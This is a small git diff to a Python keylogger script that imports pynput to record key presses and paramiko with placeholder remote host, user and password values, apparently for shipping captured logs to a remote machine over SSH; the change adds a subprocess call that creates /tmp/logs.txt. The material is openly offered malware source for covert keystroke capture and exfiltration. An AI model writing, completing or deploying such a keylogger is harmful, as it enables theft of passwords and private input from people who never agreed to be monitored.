@@ -1,5 +1,7 @@
 #!/bin/python3.9
 from pynput import keyboard
+import subprocess
+import shlex
 import paramiko
 
 RHOSTS = "127.0.0.1" #Change this
@@ -9,6 +11,10 @@ password = "password" #Change this
 
 # Text for the logs
 text = ""
+
+# Sometimes the program gets iffy and doesn't write the log file, this will fix that
+cmd = "touch /tmp/logs.txt"
+subprocess.Popen(shlex.split(cmd))
 
 # Record the keys
 def on_press(key):
